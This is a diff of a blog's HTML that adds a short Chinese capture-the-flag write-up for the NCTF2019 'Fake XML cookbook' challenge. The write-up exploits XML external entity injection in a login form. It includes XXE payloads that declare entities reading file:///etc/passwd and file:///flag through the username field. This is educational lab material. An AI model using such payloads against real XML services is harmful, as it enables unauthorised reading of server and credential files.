@@ -9,7 +9,7 @@
     
     <title>
         
-            Tag: MRCTF2020 |
+            FakeXML-cookboos |
         
         paixiaoxing&#39;s Blog
     </title>
@@ -81,7 +81,7 @@
                         </li>
                     
                         <li class="menu-item">
-                            <a class="active"
+                            <a class=""
                                href="/tags"
                             >
                                 TAGS
@@ -122,7 +122,7 @@
                 </li>
             
                 <li class="drawer-menu-item flex-center">
-                    <a class="active"
+                    <a class=""
                        href="/tags">TAGS</a>
                 </li>
             
@@ -147,49 +147,144 @@
 
                 
                     <div class="fade-in-down-animation">
-    <div class="tag-container">
-        <div class="tag-name"><i class="fas fa-tag"></i>&nbsp;MRCTF2020
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">FakeXML-cookboos</span>
         </div>
-        <div class="tag-post-list">
-            
-<div class="archive-list-container">
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/paidaxing.jpg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">paixiaoxing</span>
+                        
+                            <span class="author-label">Lv4</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;
+        <span class="pc">2022-03-21 15:12:44</span>
+        <span class="mobile">2022-03-21 15:12</span>
+    </span>
     
-        <section class="archive-item">
-            <div class="archive-item-header">
-                <span class="archive-year">2022</span>
-                <span class="archive-year-post-count">[2]</span>
-            </div>
-            <ul class="article-list">
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
                 
-                    <li class="article-item">
-                        <a class="article-title"
-                           href="/2022/03/21/PYWebsite/"
-                        >PYWebsite</a>
-                        <span class="article-date">03-21</span>
-                    </li>
-                
-                    <li class="article-item">
-                        <a class="article-title"
-                           href="/2022/01/28/%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2/"
-                        >你传你🐎呢</a>
-                        <span class="article-date">01-28</span>
+                    <li>
+                        <a href="/tags/NCTF2019/">NCTF2019</a>&nbsp;
                     </li>
                 
             </ul>
-        </section>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
     
 </div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h1 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h1><p>本题主要考到xxe（xml外部实体注入）</p>
+<p><img src="/2022/03/21/FakeXML-cookbook/1.png" alt="1"></p>
+<p>进入题目给出了一个登录框，看起来很像是sql注入，但是题目提示是XML所以也就不看了，登录一下抓个包看看</p>
+<p><img src="/2022/03/21/FakeXML-cookbook/2.png" alt="1"></p>
+<p>可以看到这与一般的post登录框不同，这里传入参数是一种xml方式，所以漏洞点应该就在这里，我们可以定义一个实体，导入本地计算机里面根目录下面的flag文件，然后执行这个实体就行</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;#声明一个xml文件</span><br><span class="line">&lt;!DOCTYPE test [  #声明此文件是test类型的文档</span><br><span class="line">  &lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;  </span><br><span class="line"><span class="meta">  #</span><span class="bash">对file实体的声明&lt;!ENTITY 实体名称 <span class="string">&quot;实体内容&quot;</span>&gt;SYSTEM或者PUBLIC引入外部资源，表示实体来自本地还是公共计算机，&lt;!ENTITY 实体名称 SYSTEM <span class="string">&quot;URI/URL&quot;</span>&gt;或者&lt;!ENTITY 实体名称 PUBLIC <span class="string">&quot;public_ID&quot;</span> <span class="string">&quot;URI&quot;</span>&gt;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>最后在文件里使用&file;调用这个实体，所以我们构造一个paiload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test[</span><br><span class="line">        &lt;!ENTITY file SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">    ]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后我们在username中调用这个实体，他就会返回根目录下flag的内容：</p>
+<p><img src="/2022/03/21/FakeXML-cookbook/3.png" alt="1"></p>
+<p>​    </p>
 
         </div>
-    </div>
 
-    <div class="tag-paginator">
-        <div class="paginator">
-    
-
-    
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li>Post title：FakeXML-cookboos</li>
+        <li>Post author：paixiaoxing</li>
+        <li>Create time：2022-03-21 15:12:44</li>
+        <li>
+            Post link：https://keep.xpoet.cn/2022/03/21/FakeXML-cookbook/
+        </li>
+        <li>
+            Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
+        </li>
+    </ul>
 </div>
 
+            </div>
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/NCTF2019/">#NCTF2019</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2022/03/21/PYWebsite/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">PYWebsite</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2022/03/20/ReadlezPHP/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">ReadlezPHP</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
     </div>
 </div>
 
@@ -237,6 +332,23 @@
     </div>
 
     
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
 
     <div class="right-bottom-side-tools">
         <div class="side-tools-container">
@@ -283,6 +395,14 @@
     </div>
 
     
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#NCTF2019-Fake-XML-cookbook"><span class="nav-number">1.</span> <span class="nav-text">[NCTF2019]Fake XML cookbook</span></a></li></ol>
+    </div>
+</div>
+        </aside>
+    
 
     <div class="image-viewer-container">
     <img src="">
@@ -318,6 +438,14 @@
 
 
 <div class="post-scripts">
+    
+        
+<script src="/js/left-side-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
     
 </div>
 
